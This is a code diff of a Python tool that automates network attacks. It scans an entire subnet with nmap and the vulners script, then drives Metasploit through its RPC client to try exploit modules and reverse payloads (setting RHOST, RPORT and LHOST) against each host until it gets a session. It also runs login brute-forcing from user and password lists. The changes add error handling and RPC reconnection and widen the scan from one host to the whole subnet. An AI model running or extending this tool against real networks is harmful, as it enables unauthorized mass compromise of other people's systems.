@@ -38,7 +38,7 @@ def banner():
 		print(spaces + " ' <' `\\ ._/'\\ ")
 		print(spaces + "    `   \\     \\ ")
 
-		time.sleep(.5)
+		time.sleep(.25)
 		os.system('clear')
 		pwny += 1
 
@@ -159,62 +159,68 @@ def exploitHost(host):
 				numServWithModsOrBrute += 1
 
 				for index, row in df.iterrows():
-					if len(client.sessions.list) < 1:
-						result = "Fail"
-						global lport
-						lport += 1 # increment lport so that modules arent trying to use the same lport
-						exploitName = row['Name'][8:]
-						print("  Attempting module: " + exploitName)
-						exploitObj = client.modules.use('exploit', exploitName)
-						for item in exploitObj.options:
-							if 'rhost' in str(item).lower():
-								exploitObj[item] = host
-							elif 'rport' in str(item).lower():
-									exploitObj[item] = port
+					try:
+						if len(client.sessions.list) < 1:
+							result = "Fail"
+							global lport
+							lport += 1 # increment lport so that modules arent trying to use the same lport
+							exploitName = row['Name'][8:]
+							print("  Attempting module: " + exploitName)
+							exploitObj = client.modules.use('exploit', exploitName)
+							for item in exploitObj.options:
+								if 'rhost' in str(item).lower():
+									exploitObj[item] = host
+								elif 'rport' in str(item).lower():
+										exploitObj[item] = port
 
-						if len(exploitObj.missing_required) > 0:
-							for item in exploitObj.missing_required:
-								print("    Item not set: " + item)
-							print("    Exiting exploit: " + exploitName)
+							if len(exploitObj.missing_required) > 0:
+								for item in exploitObj.missing_required:
+									print("    Item not set: " + item)
+								print("    Exiting exploit: " + exploitName)
 
-						else:
-							if len(exploitObj.payloads) > 0:
-								i = 0
-								while (i < len(exploitObj.payloads) and i < maxPayloads) and len(client.sessions.list) < 1:
-									try:
-										payloadName = exploitObj.payloads[i]
-										payloadObj = client.modules.use('payload', payloadName)
-										for item in payloadObj.options:
-											if 'rhost' in str(item).lower():
-												payloadObj[item] = host
-											elif 'rport' in str(item).lower():
-													payloadObj[item] = port
-											elif 'lhost' in str(item).lower():
-													payloadObj[item] = IP
+							else:
+								if len(exploitObj.payloads) > 0:
+									i = 0
+									while (i < len(exploitObj.payloads) and i < maxPayloads) and len(client.sessions.list) < 1:
+										try:
+											payloadName = exploitObj.payloads[i]
+											payloadObj = client.modules.use('payload', payloadName)
+											for item in payloadObj.options:
+												if 'rhost' in str(item).lower():
+													payloadObj[item] = host
+												elif 'rport' in str(item).lower():
+														payloadObj[item] = port
+												elif 'lhost' in str(item).lower():
+														payloadObj[item] = IP
 
-										print("    Trying payload: " + payloadName)
-										if len(payloadObj.missing_required) > 0:
-											for item in payloadObj.missing_required:
-												print("      Item not set: " + item)
-											print("      Exiting payload: " + payloadName)
+											if len(payloadObj.missing_required) > 0:
+												for item in payloadObj.missing_required:
+													print("      Item not set: " + item)
+												print("      Exiting payload: " + payloadName)
+												i += 1
+											else:
+												try:
+													exploitObj.execute(payload=payloadObj)
+													hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payloadName), 'Result':result}
+													exploitObjects.append(hostExploits)
+													i += 1
+												except:
+													print("      Bad Payload. Moving on.")
+													i += 1
+										except Exception as e:
+											print(e)
 											i += 1
-										else:
-											try:
-												exploitObj.execute(payload=payloadObj)
-												hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payloadName), 'Result':result}
-												exploitObjects.append(hostExploits)
-												i += 1
-											except:
-												print("      Bad Payload. Moving on.")
-												i += 1
-									except Exception as e:
-										print(e)
-										i += 1
-							else: # No payloads available so try exploit without any
-								print("  No payloads available. ")
-					else:
-						print("  Session was found. Exiting modules for current service.")
-						break
+								else: # No payloads available so try exploit without any
+									print("  No payloads available. ")
+						else:
+							print("  Session was found. Exiting modules for current service.")
+							break
+					except Exception as e:
+						if "Connection aborted" in e:
+							print("Connection error. The most recent calls to Msfrpc may be lost. Attempting to reconnect ...")
+							client = MsfRpcClient('testpw', port=55553, ssl=False)
+						else:
+							print(e)
 				# check that all jobs are complete
 				sleepCount = 0
 				if len(client.jobs.list) > 0: # still have jobs running so wait a max of 30 secondds if not exploited before
@@ -330,6 +336,10 @@ def main(args):
 	nm = nmap.PortScanner()
 
 	f.write('Begin Script @ {0} \n\n'.format(startTime))
+	f.write("---- Script options ----\n")
+	f.write("--> Bruteforce user file: {0}\n".format(userList))
+	f.write("--> Bruteforce password file: {0}\n".format(passList))
+	f.write("--> Max payloads per exploit module: {0} \n\n".format(str(maxPayloads)))
 	f.write('------ Your Host ------\n')
 	f.write('Host IP: {0} \n'.format(IP))
 
@@ -357,7 +367,7 @@ def main(args):
 	# NMAP subnet excluding our IP #
 	## make -Pn, -F, and speed (-T#) switch for during the run
 	print("Nmap scan started. This may take a while...")
-	nm.scan(hosts="10.0.0.8", arguments='-O -sV -T4 -p- -Pn --script vulners --exclude ' + IP)
+	nm.scan(hosts=str(subnet), arguments='-O -sV -T4 -p- -Pn --script vulners --exclude ' + IP)
 	print("Nmap scan complete!")
 
 	hostsCount = len(nm.all_hosts())
@@ -549,7 +559,7 @@ if __name__ == "__main__":
     userList = os.path.join(startDir, "bruteforce", "userList.txt")
     passList = os.path.join(startDir, "bruteforce", "passList.txt")
     parser = argparse.ArgumentParser()
-    parser.add_argument("--b", type=str, nargs=2, default=[userList,passList], help="Specify bruteforce user [arg1] and password [arg2] filepath.")
+    parser.add_argument("--b", type=str, nargs=2, default=[userList,passList], help="Specify filepaths for bruteforce users list [arg1] and passwords list [arg2].")
     parser.add_argument("--p", type=int, default=5, help="Specify number of payloads per exploit module to try.")
     args = parser.parse_args()
     main(args)
